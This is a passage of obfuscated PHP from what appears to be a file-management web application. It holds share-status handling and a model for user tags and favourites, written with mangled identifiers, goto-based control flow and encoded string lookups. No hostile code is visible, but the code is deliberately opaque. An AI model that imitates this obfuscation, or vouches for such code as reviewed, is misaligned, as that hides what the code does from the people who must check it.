array_to_keyvalue($FÔš‹“»ºã, $EÈÑœŞçŠ‰[33], $EÈÑœŞçŠ‰[466]); $d³×Ö¿àì” = array_diff($BñßÈ©‡ÅŸ, $FÔš‹“»ºã); if (!empty($d³×Ö¿àì”)) { foreach ($f¾ÍÄ¾¨º[$EÈÑœŞçŠ‰[366]] as $C¸®Ã‹éË => $C¼ŸËå‹Ùİ) { if (in_array($C¼ŸËå‹Ùİ[$EÈÑœŞçŠ‰[466]], $d³×Ö¿àì”)) { unset($f¾ÍÄ¾¨º[$EÈÑœŞçŠ‰[366]][$C¸®Ã‹éË]); } } } } goto C†‡Ş¯¥¦İ; bÈ©ËÚ­È: if (isset($BñßÈ©‡ÅŸ[$EÈÑœŞçŠ‰[29]]) && in_array($BñßÈ©‡ÅŸ[$EÈÑœŞçŠ‰[29]], array($EÈÑœŞçŠ‰[87], $EÈÑœŞçŠ‰[1849], $EÈÑœŞçŠ‰[1850], $EÈÑœŞçŠ‰[1851], $EÈÑœŞçŠ‰[1852]))) { $bßøŠæ‹ò×[$EÈÑœŞçŠ‰[29]] = $BñßÈ©‡ÅŸ[$EÈÑœŞçŠ‰[29]]; } if (isset($BñßÈ©‡ÅŸ[$EÈÑœŞçŠ‰[714]]) && in_array($BñßÈ©‡ÅŸ[$EÈÑœŞçŠ‰[714]], array($EÈÑœŞçŠ‰[495], $EÈÑœŞçŠ‰[87], $EÈÑœŞçŠ‰[1849], $EÈÑœŞçŠ‰[1850]))) { $bßøŠæ‹ò×[$EÈÑœŞçŠ‰[714]] = $BñßÈ©‡ÅŸ[$EÈÑœŞçŠ‰[714]]; } $có’ ¶Ú¯ = Input::get($EÈÑœŞçŠ‰[434], $EÈÑœŞçŠ‰[7], $EÈÑœŞçŠ‰[1848], array($EÈÑœŞçŠ‰[1772], $EÈÑœŞçŠ‰[428])); goto E‡Ì²ÒŞ¸; e¼¤±İ«ÑÛ: } public function reportStatus($F¿Ù„ù²Ø) { goto AÏ«¨“£æ; AÏ«¨“£æ: $B÷¹ì’é÷ =& $_SERVER[¬ı§†‰ú˜¼]; $f‘à»³„‰À = array($B÷¹ì’é÷[392] => $F¿Ù„ù²Ø[$B÷¹ì’é÷[392]]); $dŞ–öî¦ç = Model($B÷¹ì’é÷[1844])->where($f‘à»³„‰À)->field($B÷¹ì’é÷[1854])->find(); goto a÷ôÙ§––‡; bôÖ’¿áïì: return $EŠ–†ÔŠîÖ; goto AÌìŠ£‘†Á; C—œŠ­Œõ: $EŠ–†ÔŠîÖ = Model($B÷¹ì’é÷[1844])->where($f‘à»³„‰À)->save($f’İÖ¼˜Œ); if ($F¿Ù„ù²Ø[$B÷¹ì’é÷[714]] == $B÷¹ì’é÷[1849]) { if ($dŞ–öî¦ç[$B÷¹ì’é÷[445]] != $B÷¹ì’é÷[495] && $this->shareFileMeta($dŞ–öî¦ç[$B÷¹ì’é÷[445]])) { $this->shareFileMeta($dŞ–öî¦ç[$B÷¹ì’é÷[445]], 0); } $this->remove($dŞ–öî¦ç[$B÷¹ì’é÷[466]]); return !0; } if ($EŠ–†ÔŠîÖ && $F¿Ù„ù²Ø[$B÷¹ì’é÷[714]] == $B÷¹ì’é÷[1850]) { $C‰½¯Ûªó• = $f’İÖ¼˜Œ[$B÷¹ì’é÷[714]] == $B÷¹ì’é÷[1850] ? 1 : 0; $this->shareFileMeta($dŞ–öî¦ç[$B÷¹ì’é÷[445]], $C‰½¯Ûªó•); $this->removeByFile($dŞ–öî¦ç[$B÷¹ì’é÷[445]]); } goto bôÖ’¿áïì; a÷ôÙ§––‡: if (!$dŞ–öî¦ç) { return !1; } $f’İÖ¼˜Œ = array($B÷¹ì’é÷[714] => $F¿Ù„ù²Ø[$B÷¹ì’é÷[714]]); if ($F¿Ù„ù²Ø[$B÷¹ì’é÷[714]] == $B÷¹ì’é÷[1850] && $dŞ–öî¦ç[$B÷¹ì’é÷[714]] == $B÷¹ì’é÷[1850]) { $f’İÖ¼˜Œ[$B÷¹ì’é÷[714]] = 0; } goto C—œŠ­Œõ; AÌìŠ£‘†Á: } private function removeByFile($D¹Ö¢îìÑ) { goto FÄÀ…Áë¿„; DÇ¶›Šİ¦Ó: $B‘¢ˆ®Ã = array($CÍ‹ÅÖ§[394] => array($CÍ‹ÅÖ§[7], $aÛÓ°¤Úµ), $CÍ‹ÅÖ§[471] => 1); $BÅ²£À¶õÁ = $this->where($B‘¢ˆ®Ã)->field($CÍ‹ÅÖ§[466])->select(); if (empty($BÅ²£À¶õÁ)) { return; } goto Fòë‘àÕœ±; FÄÀ…Áë¿„: $CÍ‹ÅÖ§ =& $_SERVER[¬ı§†‰ú˜¼]; $BÅ²£À¶õÁ = Model($CÍ‹ÅÖ§[798])->where(array($CÍ‹ÅÖ§[445] => $D¹Ö¢îìÑ))->field($CÍ‹ÅÖ§[394])->select(); $aÛÓ°¤Úµ = array_to_keyvalue($BÅ²£À¶õÁ, $CÍ‹ÅÖ§[33], $CÍ‹ÅÖ§[394]); goto DÇ¶›Šİ¦Ó; Fòë‘àÕœ±: $A“Í½¼ê¶÷ = array_to_keyvalue($BÅ²£À¶õÁ, $CÍ‹ÅÖ§[33], $CÍ‹ÅÖ§[466]); $this->remove($A“Í½¼ê¶÷); goto fÑÃ³³ ¿ä; fÑÃ³³ ¿ä: } private function shareFileMeta($F…ÔŸÊ‡, $bÛò‰ÕÃõ = null) { $D†‹çÀÁ²© =& $_SERVER[¬ı§†‰ú˜¼]; $E¿«¯ˆïç¬ = array($D†‹çÀÁ²©[445] => $F…ÔŸÊ‡, $D†‹çÀÁ²©[93] => $D†‹çÀÁ²©[1855]); if (is_null($bÛò‰ÕÃõ)) { return Model($D†‹çÀÁ²©[1856])->where($E¿«¯ˆïç¬)->find(); } $E¿«¯ˆïç¬[$D†‹çÀÁ²©[371]] = $bÛò‰ÕÃõ; Model($D†‹çÀÁ²©[1856])->add($E¿«¯ˆïç¬, array(), !0); } } goto C–§‹…Ÿ•; AÜëÎ®®ê¯: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($F™ùÑç·Œµ) { $e¸½…¬Ùó¦ =& $_SERVER[¬ı§†‰ú˜¼]; return array($e¸½…¬Ùó¦[1792] => array(USER_ID, $e¸½…¬Ùó¦[1793])); } protected function listData() { $dñµ¾‰Öé =& $_SERVER[¬ı§†‰ú˜¼]; $dé›±ÅãÜ = array($dñµ¾‰Öé[1519] => USER_ID, $dñµ¾‰Öé[461] => array($dñµ¾‰Öé[1796], 0)); $Cç™¶ˆÇ¦¾ = $dñµ¾‰Öé[1798]; $eÁÚ­Ê…¬ = $this->field($Cç™¶ˆÇ¦¾)->where($dé›±ÅãÜ)->order($dñµ¾‰Öé[1799])->select(); return $eÁÚ­Ê…¬ ? $eÁÚ­Ê…¬ : array(); } protected function listByTag($E¥Ïµ‰Ë±â) { } protected function addToTag($aôÊé’Û¾¼, $AÈ©éÆ‚ìª) { $d¿’ Ôïù =& $_SERVER[¬ı§†‰ú˜¼]; if (!Model($d¿’ Ôïù[1934])->listData($AÈ©éÆ‚ìª) || !Model($d¿’ Ôïù[798])->pathInfo($aôÊé’Û¾¼)) { return !1; } $bÇô²ª¼º³ = array($d¿’ Ôïù[1519] => USER_ID, $d¿’ Ôïù[461] => $AÈ©éÆ‚ìª, $d¿’ Ôïù[412] => $aôÊé’Û¾¼, $d¿’ Ôïù[413] => $d¿’ Ôïù[407], $d¿’ Ôïù[411] => $d¿’ Ôïù[33], $d¿’ Ôïù[1694] => 0); if ($this->where($bÇô²ª¼º³)->find()) { return !1; } return $this->add($bÇô²ª¼º³); } protected function removeFromTag($Cé«‰ó¥ß, $c—Ë„×øÈß) { $C°­¸ÇÊõ =& $_SERVER[¬ı§†‰ú˜¼]; if (!Model($C°­¸ÇÊõ[1934])->listData($c—Ë„×øÈß)) { return !1; } if (is_array($Cé«‰ó¥ß)) { $Cé«‰ó¥ß = array($C°­¸ÇÊõ[7], $Cé«‰ó¥ß); } $b¾›îšàñ = array($C°­¸ÇÊõ[1519] => USER_ID, $C°­¸ÇÊõ[461] => $c—Ë„×øÈß, $C°­¸ÇÊõ[413] => $C°­¸ÇÊõ[407], $C°­¸ÇÊõ[412] => $Cé«‰ó¥ß); return $this->where($b¾›îšàñ)->delete(); } protected function removeByTag($b¿×ö”İ•ë) { $dêˆøƒ¿™æ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$b¿×ö”İ•ë) { return !1; } $FÇçœÊí† = array($dêˆøƒ¿™æ[1519] => USER_ID, $dêˆøƒ¿™æ[461] => $b¿×ö”İ•ë); return $this->where($FÇçœÊí†)->delete(); } protected function removeBySource($d“¾ôŒæ») { $CÓ® ë¯ˆá =& $_SERVER[¬ı§†‰ú˜¼]; if (is_array($d“¾ôŒæ»)) { $d“¾ôŒæ» = array($CÓ® ë¯ˆá[7], $d“¾ôŒæ»); } $A¾¾ˆº™ = array($CÓ® ë¯ˆá[1519] => USER_ID, $CÓ® ë¯ˆá[412] => $d“¾ôŒæ», $CÓ® ë¯ˆá[461] => array($CÓ® ë¯ˆá[970], 0)); return $this->where($A¾¾ˆº™)->delete(); } }